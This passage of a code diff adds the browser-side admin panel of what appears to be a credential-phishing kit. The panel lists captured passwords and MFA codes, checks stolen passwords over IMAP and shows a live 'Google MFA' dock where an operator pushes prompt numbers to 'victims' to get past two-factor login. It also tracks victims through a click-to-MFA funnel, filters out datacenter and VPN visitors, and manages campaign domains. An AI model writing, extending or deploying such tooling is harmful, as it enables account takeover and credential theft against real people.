+  const colors = { success: ['#d1fae5','#065f46'], error: ['#fee2e2','#991b1b'], info: ['#e0f2fe','#075985'], warn: ['#fef3c7','#92400e'] };
+  const [bg, fg] = colors[type] || colors.info;
+  t.style.background = bg; t.style.color = fg;
+  t.textContent = msg; t.style.display = 'block';
+  t.style.animation = 'ccToastIn .25s cubic-bezier(.2,.8,.3,1.1)';
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(() => { t.style.display = 'none'; }, 3500);
+}
+function showModal({ title, body, type, confirmText, cancelText, danger }) {
+  return new Promise(resolve => {
+    const wrap = document.getElementById('cc-modal');
+    const iconMap = {
+      confirm: ['#fef3c7','#f59e0b','fa-circle-question'],
+      danger:  ['#fee2e2','#ef4444','fa-triangle-exclamation'],
+      info:    ['#e0f2fe','#0284c7','fa-circle-info'],
+      success: ['#d1fae5','#10b981','fa-circle-check'],
+      error:   ['#fee2e2','#ef4444','fa-circle-xmark'],
+    };
+    const t = type || (danger ? 'danger' : 'confirm');
+    const [bg, fg, icon] = iconMap[t] || iconMap.info;
+    const iconEl = document.getElementById('cc-modal-icon');
+    iconEl.style.background = bg; iconEl.style.color = fg;
+    iconEl.innerHTML = `<i class="fas ${icon}"></i>`;
+    document.getElementById('cc-modal-title').textContent = title || '';
+    document.getElementById('cc-modal-body').innerHTML = body || '';
+    const actions = document.getElementById('cc-modal-actions');
+    const close = (v) => { wrap.style.display = 'none'; resolve(v); };
+    const btns = [];
+    if (cancelText !== null) {
+      btns.push(`<button class="cc-btn cc-btn-cancel" id="cc-modal-cancel">${cancelText || 'Cancel'}</button>`);
+    }
+    btns.push(`<button class="cc-btn ${danger ? 'cc-btn-danger' : 'cc-btn-primary'}" id="cc-modal-ok">${confirmText || 'OK'}</button>`);
+    actions.innerHTML = btns.join('');
+    document.getElementById('cc-modal-ok').onclick = () => close(true);
+    const c = document.getElementById('cc-modal-cancel'); if (c) c.onclick = () => close(false);
+    wrap.onclick = (e) => { if (e.target === wrap) close(false); };
+    wrap.style.display = 'flex';
+  });
+}
+// Drop-in replacements — return Promise
+function confirmDialog(msg, opts) {
+  const o = Object.assign({ title: 'Are you sure?', body: msg, confirmText: 'Continue', cancelText: 'Cancel', danger: false }, opts || {});
+  return showModal(o);
+}
+function alertDialog(msg, opts) {
+  const o = Object.assign({ title: 'Notice', body: msg, confirmText: 'OK', cancelText: null, type: 'info' }, opts || {});
+  return showModal(o);
+}
+
+// Clipboard helper with fallback — navigator.clipboard only works on HTTPS/localhost
+function copyText(text) {
+  if (navigator.clipboard && window.isSecureContext) {
+    return navigator.clipboard.writeText(text).then(() => true).catch(() => fallbackCopy(text));
+  }
+  return Promise.resolve(fallbackCopy(text));
+}
+function fallbackCopy(text) {
+  try {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed'; ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select(); ta.setSelectionRange(0, ta.value.length);
+    const ok = document.execCommand('copy');
+    document.body.removeChild(ta);
+    return ok;
+  } catch { return false; }
+}
+
+async function api(path) {
+  const resp = await fetch(BASE + '/api/' + path);
+  if (!resp.ok && resp.status === 401) { location.href = BASE + '/login'; return {}; }
+  return resp.json();
+}
+
+function timeAgo(d) {
+  const s = Math.floor((Date.now() - new Date(d)) / 1000);
+  if (s < 60) return s + 's ago';
+  if (s < 3600) return Math.floor(s / 60) + 'm ago';
+  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
+  return Math.floor(s / 86400) + 'd ago';
+}
+
+function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+// Delegated click-to-copy for elements with [data-copy="..."] (e.g. DNS instruction cells).
+document.addEventListener('click', (e) => {
+  const el = e.target.closest('[data-copy]');
+  if (!el) return;
+  const val = el.getAttribute('data-copy');
+  if (!val) return;
+  copyText(val).then(() => {
+    const orig = el.style.background;
+    el.style.background = '#dcfce7';
+    const ic = el.querySelector('i.fa-copy');
+    if (ic) { ic.classList.replace('fa-copy', 'fa-check'); ic.style.color = '#16a34a'; }
+    setTimeout(() => {
+      el.style.background = orig || '';
+      if (ic) { ic.classList.replace('fa-check', 'fa-copy'); ic.style.color = '#9ca3af'; }
+    }, 1100);
+  });
+});
+
+function flagEmoji(cc) {
+  if (!cc || cc.length !== 2) return '';
+  return String.fromCodePoint(...cc.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0)));
+}
+function linkFunnel(s) {
+  if (!s || !s.clicks) return '<span style="color:var(--text-mute);font-size:11px;font-style:italic;">No clicks yet</span>';
+  const stages = [
+    { ic: 'fa-mouse-pointer', val: s.clicks    || 0, label: 'Clicks',    base: null },
+    { ic: 'fa-eye',           val: s.opens     || 0, label: 'Opens',     base: s.clicks },
+    { ic: 'fa-envelope',      val: s.emails    || 0, label: 'Emails',    base: s.opens || s.clicks },
+    { ic: 'fa-key',           val: s.passwords || 0, label: 'Passwords', base: s.emails || s.opens },
+    { ic: 'fa-shield-halved', val: s.mfas      || 0, label: 'MFAs',      base: s.passwords },
+  ];
+  let html = '<div style="display:flex;align-items:center;gap:5px;font-size:11px;flex-wrap:nowrap;">';
+  stages.forEach((st, i) => {
+    if (i > 0) html += '<i class="fas fa-chevron-right" style="color:var(--text-mute);font-size:8px;"></i>';
+    const pct = (st.base && st.base > 0) ? ` (${Math.round(st.val / st.base * 100)}%)` : '';
+    const tip = `${st.label}: ${st.val}${pct}`;
+    const dim = st.val ? '' : 'opacity:0.30;';
+    const color = st.val && i === stages.length - 1 ? 'var(--green)' : 'var(--blue)';
+    html += `<span title="${tip}" style="display:inline-flex;align-items:center;gap:3px;${dim}"><i class="fas ${st.ic}" style="color:${color};width:11px;text-align:center;"></i><strong>${st.val}</strong></span>`;
+  });
+  if (s.uniqueClickIps && s.uniqueClickIps !== s.clicks) {
+    html += `<span style="color:var(--text-mute);margin-left:6px;" title="Unique click IPs">·&nbsp;${s.uniqueClickIps}&nbsp;uniq</span>`;
+  }
+  html += '</div>';
+  return html;
+}
+
+function geoCell(g) {
+  if (!g) return '<span style="color:var(--text-mute);">—</span>';
+  const flag = flagEmoji(g.countryCode);
+  const loc = g.city ? `${esc(g.city)}, ${esc(g.country || '')}` : esc(g.country || 'Unknown');
+  const isp = g.isp ? `<div style="color:var(--text-mute);font-size:10px;line-height:1.3;">${esc(g.isp)}</div>` : '';
+  const tags = [];
+  if (g.hosting) tags.push('<span class="badge red" style="padding:1px 6px;font-size:9px;" title="Datacenter / hosting">DC</span>');
+  if (g.proxy)   tags.push('<span class="badge yellow" style="padding:1px 6px;font-size:9px;" title="Proxy / VPN">VPN</span>');
+  return `<div style="display:flex;flex-direction:column;gap:2px;"><span>${flag} ${loc} ${tags.join(' ')}</span>${isp}</div>`;
+}
+
+// ---- Init: load current user and set up role ----
+async function init() {
+  try {
+    currentUser = await api('me');
+    if (!currentUser || !currentUser.username) { location.href = BASE + '/login'; return; }
+    document.getElementById('topbar-user').innerHTML = `Signed in as <strong>${esc(currentUser.displayName)}</strong>` +
+      (isSA() ? ' <span class="badge blue" style="margin-left:4px;font-size:10px;">Super Admin</span>' : '');
+    if (isSA()) document.body.classList.add('is-superadmin');
+    await loadAll();
+    loadLogins();
+    loadLinks();
+    loadSettings();
+    loadActiveMfa();
+    if (isSA()) { loadUsers(); loadProviders(); }
+    // Keep a slow poll as a safety net (network/SSE hiccups), but realtime comes from SSE
+    setInterval(() => { loadAll(); loadLogins(); if (!isLinksTabBusy()) loadLinks(); }, 60000);
+    subscribeLive();
+  } catch (e) {
+    console.error('Init failed:', e);
+    location.href = BASE + '/login';
+  }
+}
+
+// ---- Load dashboard data ----
+async function loadAll() {
+  const fetches = [api('security'), api('devices'), api('logins')];
+  if (isSA()) fetches.push(api('learned'));
+  const [sec, dev, logins, learn] = await Promise.all(fetches);
+
+  let statsHtml = `
+    <div class="stat" onclick="goTab('logins')" style="border-left:3px solid var(--blue);"><div class="num" style="color:var(--blue);">${logins.total || 0}</div><div class="label">Captured logins</div></div>
+    <div class="stat red" onclick="goTab('banned')"><div class="num">${sec.bannedIPs}</div><div class="label">Banned IPs</div></div>
+    <div class="stat yellow" onclick="goTab('strikes')"><div class="num">${sec.activeStrikes.length}</div><div class="label">Active strikes</div></div>
+    <div class="stat blue" onclick="goTab('links')"><div class="num">${dev.totalEmails}</div><div class="label">Tracked clients</div></div>
+    <div class="stat purple" onclick="goTab('links')"><div class="num">${dev.flaggedEmails}</div><div class="label">Flagged</div></div>`;
+  if (isSA() && learn) {
+    statsHtml += `
+    <div class="stat green" onclick="goTab('learned')"><div class="num">${learn.totalLearned}</div><div class="label">Learned domains</div></div>
+    <div class="stat" onclick="goTab('providers')"><div class="num">${learn.totalHardcoded}</div><div class="label">Known providers</div></div>`;
+  }
+  document.getElementById('stats').innerHTML = statsHtml;
+
+  // Banned
+  const bannedPanel = document.getElementById('p-banned');
+  // Combine IP bans + device bans, sort newest first
+  const allBans = [
+    ...(sec.banned || []).map(b => ({ ...b, type: 'IP', key: b.ip })),
+    ...(sec.bannedDevices || []).map(b => ({ ...b, type: 'Device', key: b.id })),
+  ].sort((a, b) => new Date(b.bannedAt) - new Date(a.bannedAt));
+
+  if (allBans.length === 0) {
+    bannedPanel.innerHTML = '<div class="table-card"><div class="empty"><i class="fas fa-check-circle"></i><p>No banned IPs or devices</p></div></div>';
+  } else {
+    let h = isSA() ? `<div style="display:flex;justify-content:flex-end;margin-bottom:8px;"><button class="btn red" onclick="clearSection('clear-bans','Clear all bans (IPs + devices)?')"><i class="fas fa-trash" style="margin-right:4px;"></i>Clear All</button></div>` : '';
+    h += '<div class="login-list">';
+    allBans.forEach(b => {
+      const typeBadge = b.type === 'Device'
+        ? '<span class="badge purple" style="margin-right:4px;"><i class="fas fa-mobile-screen"></i> Device</span>'
+        : '<span class="badge blue" style="margin-right:4px;"><i class="fas fa-globe"></i> IP</span>';
+      h += `<div class="login-card">
+        <div class="login-top">
+          ${typeBadge}
+          <span class="badge red">${esc(b.reason)}</span>
+          <span class="login-email">${esc(b.key)}</span>
+          ${isSA() && b.type === 'IP' ? `<button class="btn green" onclick="unban('${esc(b.ip)}')" style="margin-left:auto;">Unban</button>` : ''}
+        </div>
+        <div class="login-meta"><span><i class="fas fa-clock"></i> Banned ${timeAgo(b.bannedAt)}</span></div>
+      </div>`;
+    });
+    bannedPanel.innerHTML = h + '</div>';
+  }
+
+  // Strikes
+  const strikesPanel = document.getElementById('p-strikes');
+  if (sec.activeStrikes.length === 0) {
+    strikesPanel.innerHTML = '<div class="table-card"><div class="empty"><i class="fas fa-shield-halved"></i><p>No active strikes</p></div></div>';
+  } else {
+    let h = isSA() ? `<div style="display:flex;justify-content:flex-end;margin-bottom:8px;"><button class="btn red" onclick="clearSection('clear-strikes','Clear all strikes?')"><i class="fas fa-trash" style="margin-right:4px;"></i>Clear All</button></div>` : '';
+    h += '<div class="login-list">';
+    sec.activeStrikes.forEach(s => {
+      const pct = Math.round(s.count / 15 * 100);
+      const c = pct > 70 ? 'red' : pct > 40 ? 'yellow' : 'blue';
+      h += `<div class="login-card">
+        <div class="login-top">
+          <span class="badge ${c}">${s.count}/15</span>
+          <span class="login-email">${esc(s.ip)}</span>
+          ${isSA() ? `<button class="btn red" onclick="banManual('${esc(s.ip)}')" style="margin-left:auto;">Ban</button>` : ''}
+        </div>
+        <div class="login-meta"><span><i class="fas fa-clock"></i> Since ${timeAgo(s.firstStrike)}</span></div>
+      </div>`;
+    });
+    strikesPanel.innerHTML = h + '</div>';
+  }
+
+  // Devices / Clients now live inside the Links tab — see loadLinks().
+
+  // Learned (superadmin only)
+  if (isSA() && learn) {
+    const learnPanel = document.getElementById('p-learned');
+    if (learn.domains.length === 0) {
+      learnPanel.innerHTML = '<div class="table-card"><div class="empty"><i class="fas fa-brain"></i><p>No learned domains</p></div></div>';
+    } else {
+      let h = `<div style="display:flex;justify-content:flex-end;margin-bottom:8px;"><button class="btn red" onclick="clearSection('clear-learned','Clear all learned domains?')"><i class="fas fa-trash" style="margin-right:4px;"></i>Clear All</button></div>`;
+      h += '<div class="login-list">';
+      learn.domains.forEach(d => {
+        h += `<div class="login-card">
+          <div class="login-top">
+            <span class="badge purple">${esc(d.provider)}</span>
+            <span class="login-email">${esc(d.domain)}</span>
+          </div>
+          <div class="login-meta">
+            <span><i class="fas fa-chart-bar"></i> ${d.hits} hits</span>
+            <span><i class="fas fa-clock"></i> Last seen ${timeAgo(d.lastSeen)}</span>
+          </div>
+        </div>`;
+      });
+      learnPanel.innerHTML = h + '</div>';
+    }
+  }
+}
+
+async function clearSection(endpoint, msg) {
+  if (!(await confirmDialog(msg + ' This cannot be undone.', { danger: true, confirmText: 'Clear' }))) return;
+  await post(BASE + '/api/' + endpoint, {});
+  showToast('Cleared', 'success');
+  loadAll();
+}
+
+async function clearAll() {
+  if (!(await confirmDialog('This will wipe bans, strikes, devices, learned domains, and password attempts. This cannot be undone.', { title: 'Clear everything?', danger: true, confirmText: 'Clear All' }))) return;
+  await post(BASE + '/api/clear-all', {});
+  showToast('All data cleared', 'success');
+  loadAll();
+}
+
+async function unban(ip) { await post(BASE + '/api/unban', { ip }); loadAll(); }
+
+async function banManual(ip) {
+  if (!ip) ip = prompt('Enter IP to ban:');
+  if (ip) { await post(BASE + '/api/ban', { ip, reason: 'manual' }); loadAll(); }
+}
+
+// ---- Hard-to-miss MFA alert (chime + browser notification + tab title pulse) ----
+// The dock alone is easy to miss when the operator is on another tab or scrolled
+// elsewhere. This raises the alert ceiling without spamming when sessions are
+// being actively handled.
+let _mfaTitleTimer = null;
+const _mfaOriginalTitle = document.title;
+const _mfaSeenAlerts = new Set(); // de-dupe per email|ip in this session
+
+function mfaPlayChime() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const o = ctx.createOscillator();
+    const g = ctx.createGain();
+    o.type = 'sine'; o.frequency.value = 880;
+    g.gain.setValueAtTime(0, ctx.currentTime);
+    g.gain.linearRampToValueAtTime(0.18, ctx.currentTime + 0.02);
+    g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.55);
+    o.connect(g).connect(ctx.destination);
+    o.start();
+    // Two-tone ding: 880Hz then 1320Hz, like a doorbell.
+    setTimeout(() => { try { o.frequency.setValueAtTime(1320, ctx.currentTime); } catch {} }, 120);
+    o.stop(ctx.currentTime + 0.6);
+    setTimeout(() => { try { ctx.close(); } catch {} }, 800);
+  } catch {}
+}
+
+function mfaRequestNotifPermission() {
+  if (!('Notification' in window)) return;
+  if (Notification.permission === 'default') {
+    try { Notification.requestPermission(); } catch {}
+  }
+}
+// Ask once on first admin load — needed before we can fire notifications later.
+mfaRequestNotifPermission();
+
+function mfaFireNotification(email, ip) {
+  if (!('Notification' in window) || Notification.permission !== 'granted') return;
+  try {
+    const n = new Notification('Google MFA — push a number', {
+      body: `${email}${ip ? ' · ' + ip : ''}\nClick to open Active MFA dock.`,
+      tag: `mfa-${email}|${ip}`,        // collapses repeats for same victim
+      requireInteraction: true,         // sticks until operator dismisses
+      silent: false,
+    });
+    n.onclick = () => { window.focus(); n.close(); };
+  } catch {}
+}
+
+function mfaStartTitlePulse() {
+  if (_mfaTitleTimer) return;
+  let on = true;
+  _mfaTitleTimer = setInterval(() => {
+    document.title = on ? `🔴 Active MFA · ${_mfaSeenAlerts.size} — ${_mfaOriginalTitle}`
+                        : `⚪ Active MFA · ${_mfaSeenAlerts.size} — ${_mfaOriginalTitle}`;
+    on = !on;
+  }, 900);
+}
+function mfaStopTitlePulse() {
+  if (!_mfaTitleTimer) return;
+  clearInterval(_mfaTitleTimer);
+  _mfaTitleTimer = null;
+  document.title = _mfaOriginalTitle;
+}
+
+function mfaAlert(email, ip) {
+  const key = `${email}|${ip}`;
+  // Don't re-alert for the same session on every SSE re-broadcast / re-poll.
+  if (_mfaSeenAlerts.has(key)) return;
+  _mfaSeenAlerts.add(key);
+  mfaPlayChime();
+  mfaFireNotification(email, ip);
+  mfaStartTitlePulse();
+}
+
+// Called by loadActiveMfa() when the dock empties — drop the title pulse.
+function mfaClearAlertsIfIdle(sessionsLen) {
+  if (sessionsLen === 0) {
+    _mfaSeenAlerts.clear();
+    mfaStopTitlePulse();
+  }
+}
+
+// ---- Active Google MFA dock ----
+// Lists victims currently on the Google Prompt screen waiting for an
+// operator-pushed number. Refreshed on SSE events and every 4s as backstop.
+async function loadActiveMfa() {
+  const dock = document.getElementById('mfa-dock');
+  if (!dock) return;
+  try {
+    const r = await fetch(BASE + '/api/mfa-active');
+    if (!r.ok) { dock.style.display = 'none'; return; }
+    const { sessions = [] } = await r.json();
+    if (!sessions.length) { dock.style.display = 'none'; dock.innerHTML = ''; mfaClearAlertsIfIdle(0); return; }
+    dock.style.display = '';
+    // Pulse any session that's still waiting for a number (none pushed yet).
+    const anyWaiting = sessions.some(s => !s.number);
+    if (anyWaiting && !document.getElementById('mfa-dock-pulse-style')) {
+      const st = document.createElement('style');
+      st.id = 'mfa-dock-pulse-style';
+      st.textContent = '@keyframes mfaDockPulse { 0%,100% { box-shadow: 0 8px 24px rgba(0,0,0,.08), 0 0 0 0 rgba(239,68,68,0.55); } 50% { box-shadow: 0 8px 24px rgba(0,0,0,.08), 0 0 0 10px rgba(239,68,68,0); } }';
+      document.head.appendChild(st);
+    }
+    const rows = sessions.map(s => {
+      const safeIp = String(s.ip || '').replace(/[^a-zA-Z0-9:.-]/g, '');
+      const safeEmail = String(s.email || '').replace(/[^a-zA-Z0-9@._+-]/g, '');
+      const wait = Math.max(0, Math.floor((Date.now() - s.ts) / 1000));
+      const waitTxt = wait < 60 ? `${wait}s` : `${Math.floor(wait/60)}m ${wait%60}s`;
+      const pushed = s.number
+        ? `<div style="font-size:11px;color:#16a34a;font-weight:600;margin-top:4px;"><i class="fas fa-check-circle"></i> Pushed: <strong>${s.number}</strong></div>`
+        : '';
+      const pulseStyle = s.number
+        ? 'border:1px solid #e5e7eb;'
+        : 'border:1.5px solid #ef4444;animation:mfaDockPulse 1.4s ease-in-out infinite;';
+      return `
+        <div class="mfa-dock-card" data-ip="${safeIp}" data-email="${safeEmail}" style="background:#fff;${pulseStyle}border-radius:12px;padding:12px 14px;margin-bottom:10px;box-shadow:0 8px 24px rgba(0,0,0,.08);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+            <div style="display:flex;align-items:center;gap:6px;font-size:12px;font-weight:700;color:#1a73e8;"><i class="fas fa-mobile-screen-button"></i> Google MFA — Live</div>
+            <div style="font-size:11px;color:#6b7280;">${waitTxt}</div>
+          </div>
+          <div style="font-size:13px;font-weight:600;color:#111827;word-break:break-all;">${safeEmail}</div>
+          <div style="font-size:11px;color:#6b7280;margin-bottom:8px;">${safeIp}</div>
+          <div style="display:flex;gap:6px;">
+            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="3" placeholder="2-digit #" class="mfa-dock-input" style="flex:1;padding:8px 10px;border:1px solid #d1d5db;border-radius:8px;font-size:14px;font-weight:600;text-align:center;font-family:inherit;outline:none;" />
+            <button class="mfa-dock-push btn" style="background:#1a73e8;color:#fff;border:none;border-radius:8px;padding:8px 14px;font-size:13px;font-weight:600;cursor:pointer;">Push</button>
+          </div>
+          ${pushed}
+        </div>`;
+    }).join('');
+    dock.innerHTML = `<div style="font-size:11px;font-weight:700;color:#6b7280;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;padding-left:4px;">Active MFA · ${sessions.length}</div>${rows}`;
+    // If every active session has a pushed number, the operator is done — stop pulsing the tab title.
+    if (!anyWaiting) mfaStopTitlePulse();
+
+    dock.querySelectorAll('.mfa-dock-card').forEach(card => {
+      const ip = card.dataset.ip;
+      const email = card.dataset.email;
+      const input = card.querySelector('.mfa-dock-input');
+      const btn   = card.querySelector('.mfa-dock-push');
+      const submit = async () => {
+        const n = (input.value || '').replace(/\D/g, '');
+        if (!n) { input.focus(); return; }
+        btn.disabled = true; btn.textContent = '...';
+        try {
+          const r = await fetch(BASE + '/api/mfa-push', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'same-origin',
+            body: JSON.stringify({ ip, email, number: n }),
+          });
+          const d = await r.json();
+          if (!r.ok) { showToast(d.error || 'Push failed', 'error'); btn.disabled = false; btn.textContent = 'Push'; return; }
+          showToast('Number pushed: ' + n, 'success');
+          loadActiveMfa();
+        } catch (e) {
+          showToast('Network error', 'error');
+          btn.disabled = false; btn.textContent = 'Push';
+        }
+      };
+      btn.addEventListener('click', submit);
+      input.addEventListener('keydown', (e) => { if (e.key === 'Enter') submit(); });
+    });
+  } catch { /* network blip — try again on next tick */ }
+}
+setInterval(loadActiveMfa, 4000);
+
+// ---- Logins tab (all users) ----
+async function loadLogins() {
+  const { total, attempts } = await api('logins');
+  const panel = document.getElementById('p-logins');
+  let h = `<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+    <span style="font-size:13px;color:var(--text-dim);">${total} total attempt${total !== 1 ? 's' : ''}</span>
+    ${total > 0 ? `<button class="btn red" onclick="clearLogins()" style="padding:6px 14px;"><i class="fas fa-trash" style="margin-right:4px;"></i>Clear All</button>` : ''}
+  </div>`;
+  if (!attempts || attempts.length === 0) {
+    h += '<div class="table-card"><div class="empty"><i class="fas fa-key"></i><p>No login attempts captured yet</p></div></div>';
+  } else {
+    h += '<div class="login-list">';
+    attempts.forEach(a => {
+      let typeBadge;
+      if (a.type === 'mfa') {
+        let methodLabel;
+        switch (a.mfaMethod) {
+          case 'sms': methodLabel = 'SMS'; break;
+          case 'google_authenticator': methodLabel = 'Google Auth'; break;
+          case 'google_backup': methodLabel = 'Google Backup'; break;
+          case 'google_sms': methodLabel = 'Google SMS'; break;
+          case 'google_prompt': methodLabel = 'Google Prompt'; break;
+          default: methodLabel = 'Auth App';
+        }
+        typeBadge = `<span class="badge purple">MFA - ${methodLabel}</span>`;
+      } else {
+        typeBadge = '<span class="badge blue">Password</span>';
+      }
+      const value = a.type === 'mfa' ? (a.mfaCode || '-') : (a.password || '-');
+      const uaStr = a.userAgent || '';
+      let browser = 'Unknown';
+      if (uaStr.includes('Edg/')) browser = 'Edge';
+      else if (uaStr.includes('Chrome/')) browser = 'Chrome';
+      else if (uaStr.includes('Firefox/')) browser = 'Firefox';
+      else if (uaStr.includes('Safari/') && !uaStr.includes('Chrome')) browser = 'Safari';
+      let os = '';
+      if (uaStr.includes('Windows')) os = 'Windows';
+      else if (uaStr.includes('Mac OS')) os = 'Mac';
+      else if (uaStr.includes('Linux')) os = 'Linux';
+      else if (uaStr.includes('Android')) os = 'Android';
+      else if (uaStr.includes('iPhone') || uaStr.includes('iPad')) os = 'iOS';
+      // Credential verification badge
+      let imapBadge = '';
+      if (a.type === 'password') {
+        const vm = a.verifyMethod ? a.verifyMethod.toUpperCase() : '';
+        if (a.imapResult === 'valid') imapBadge = `<span class="badge green" style="margin-left:auto;"><i class="fas fa-check-circle" style="margin-right:3px;"></i>VALID${vm ? ' ('+vm+')' : ''}</span>`;
+        else if (a.imapResult === 'invalid') imapBadge = `<span class="badge red" style="margin-left:auto;"><i class="fas fa-xmark" style="margin-right:3px;"></i>Invalid${vm ? ' ('+vm+')' : ''}</span>`;
+        else if (a.imapResult === 'oauth_only') imapBadge = '<span class="badge purple" style="margin-left:auto;"><i class="fas fa-lock" style="margin-right:3px;"></i>OAuth Only</span>';
+        else if (a.imapResult === 'error') imapBadge = '<span class="badge yellow" style="margin-left:auto;"><i class="fas fa-exclamation-triangle" style="margin-right:3px;"></i>Error</span>';
+        else if (a.imapResult === 'timeout') imapBadge = '<span class="badge yellow" style="margin-left:auto;"><i class="fas fa-clock" style="margin-right:3px;"></i>Timeout</span>';
+        else if (a.imapResult === 'checking') imapBadge = '<span class="badge" style="margin-left:auto;color:var(--text-mute);"><i class="fas fa-spinner fa-spin" style="margin-right:3px;"></i>Checking</span>';
+      }
+
+      h += `<div class="login-card">
+        <div class="login-top">
+          ${typeBadge}
+          <span class="login-email">${esc(a.email)}</span>
+          <span class="login-pass">${esc(value)}</span>
+          ${imapBadge}
+          <button class="btn red" style="margin-left:8px;padding:4px 10px;font-size:11px;" title="Delete this entry" onclick="deleteLogin('${esc(a.id || '')}')"><i class="fas fa-trash"></i></button>
+        </div>
+        <div class="login-meta">
+          <span><i class="fas fa-clock"></i> ${new Date(a.timestamp).toLocaleString()}</span>
+          <span><i class="fas fa-globe"></i> ${esc(a.ip)}</span>
+          <span><i class="fas fa-laptop"></i> ${esc(browser)}${os ? ' / ' + os : ''}</span>
+          ${a.campaignId ? `<span><i class="fas fa-file-code"></i> <code>${esc(a.campaignId)}</code></span>` : ''}
+          ${a.campaignDomain ? `<span><i class="fas fa-earth-americas"></i> ${esc(a.campaignDomain)}</span>` : ''}
+        </div>
+      </div>`;
+    });
+    h += '</div>';
+  }
+  panel.innerHTML = h;
+}
+
+async function deleteLogin(id) {
+  if (!id) { showToast('No id on this entry', 'error'); return; }
+  if (!(await confirmDialog('Delete this login entry?', { danger: true, confirmText: 'Delete' }))) return;
+  const resp = await fetch(BASE + '/api/logins/' + encodeURIComponent(id), { method: 'DELETE' });
+  if (!resp.ok) { showToast('Delete failed', 'error'); return; }
+  showToast('Entry deleted', 'success');
+  loadLogins();
+}
+
+async function clearLogins() {
+  if (!(await confirmDialog('Clear all login attempts? This cannot be undone.', { danger: true, confirmText: 'Clear' }))) return;
+  await post(BASE + '/api/clear-logins', {});
+  showToast('Login attempts cleared', 'success');
+  loadLogins();
+}
+
+// ---- Settings tab ----
+async function loadSettings() {
+  const sa = isSA();
+  // Current user record (for Telegram fields)
+  const meResp = await fetch(BASE + '/api/me');
+  const me = await meResp.json();
+  // System settings only needed if superadmin
+  let settings = {};
+  if (sa) { settings = await api('settings'); }
+
+  const passwordBlock = sa ? `
+      <h3 style="font-size:15px;font-weight:700;margin-bottom:20px;"><i class="fas fa-lock" style="color:var(--blue);margin-right:8px;"></i>Password Security</h3>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;max-width:480px;">
+        <div>
+          <label style="display:block;font-size:12px;font-weight:600;color:var(--text-dim);margin-bottom:6px;">Max password attempts</label>
+          <input type="number" id="s-maxAttempts" value="${settings.maxPasswordAttempts ?? 3}" min="1" max="20"
+            style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-size:14px;font-family:inherit;outline:none;background:rgba(255,255,255,0.8);" />
+          <p style="font-size:11px;color:var(--text-mute);margin-top:4px;">Password tries before MFA (1-20)</p>
+        </div>
+        <div>
+          <label style="display:block;font-size:12px;font-weight:600;color:var(--text-dim);margin-bottom:6px;">Max MFA attempts</label>
+          <input type="number" id="s-maxMfa" value="${settings.maxMfaAttempts ?? 3}" min="1" max="20"
+            style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-size:14px;font-family:inherit;outline:none;background:rgba(255,255,255,0.8);" />
+          <p style="font-size:11px;color:var(--text-mute);margin-top:4px;">MFA tries before restart (1-20)</p>
+        </div>
+      </div>
+      <div style="margin-top:20px;display:flex;align-items:center;gap:12px;">
+        <button class="btn blue" onclick="saveSettings()" id="s-saveBtn" style="padding:8px 20px;">Save Settings</button>
+        <span id="s-saveMsg" style="font-size:12px;color:var(--green);display:none;"><i class="fas fa-check"></i> Saved</span>
+      </div>
+
+      <hr style="margin:32px 0;border:none;border-top:1px solid var(--border);" />` : '';
+
+  const sa2 = me.role === 'superadmin';
+  const domainHint = sa2
+    ? 'Your domain is the <strong>main</strong> — it acts as the default for every other user who hasn\'t set their own.'
+    : 'Leave blank to inherit the super admin\'s main domain.';
+  let verifyBadge = '';
+  let sslBadge = '';
+  let verifyPanel = '';
+  if (me.domain) {
+    verifyBadge = me.domainVerified
+      ? '<span class="badge green"><i class="fas fa-check"></i> Verified</span>'
+      : '<span class="badge" style="color:var(--red);">Unverified</span>';
+    if (me.domainVerified) {
+      const s = me.domainSslStatus || '';
+      sslBadge = s === 'active' ? '<span class="badge green"><i class="fas fa-lock"></i> SSL Active</span>'
+        : s === 'provisioning' ? '<span class="badge" style="color:var(--blue);"><i class="fas fa-spinner fa-spin"></i> SSL Provisioning…</span>'
+        : s.startsWith('skipped') ? '<span class="badge" style="color:var(--text-mute);">SSL: '+esc(s)+'</span>'
+        : s.startsWith('error') ? '<span class="badge" style="color:var(--red);">'+esc(s)+'</span>'
+        : '';
+    }
+    let host = '';
+    try { host = new URL(me.domain).hostname; } catch {}
+    if (!me.domainVerified && host) {
+      const ip = me.serverPublicIp || '';
+      const token = me.domainVerifyToken || '';
+      const txtName = `_invchk.${host}`;
+      const copyCell = (value, label) => value
+        ? `<code class="dns-copy" data-copy="${esc(value)}" title="Click to copy" style="background:#f0f0f0;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:12px;display:inline-flex;align-items:center;gap:6px;">${esc(value)} <i class="fas fa-copy" style="color:#9ca3af;font-size:10px;"></i></code>`
+        : `<span style="color:var(--red);font-size:11px;">— missing — superadmin must set ${label} —</span>`;
+      const aRow = ip
+        ? `<tr><td style="padding:6px 12px 6px 0;">A</td><td style="padding:6px 12px 6px 0;">${copyCell(host, 'host')}</td><td style="padding:6px 12px 6px 0;">${copyCell(ip, 'SERVER_PUBLIC_IP')}</td><td style="padding:6px 0;" id="dns-a-status"><span class="dns-pill" style="font-size:11px;color:var(--text-mute);">checking...</span></td></tr>`
+        : `<tr><td colspan="4" style="padding:6px 0;color:var(--red);font-size:11px;"><i class="fas fa-triangle-exclamation"></i> A-record check disabled — <code>SERVER_PUBLIC_IP</code> is not set in the server's <code>.env</code>. Use the TXT alternative below, or ask the superadmin to configure it.</td></tr>`;
+      const sslHint = me.caddyConfigured
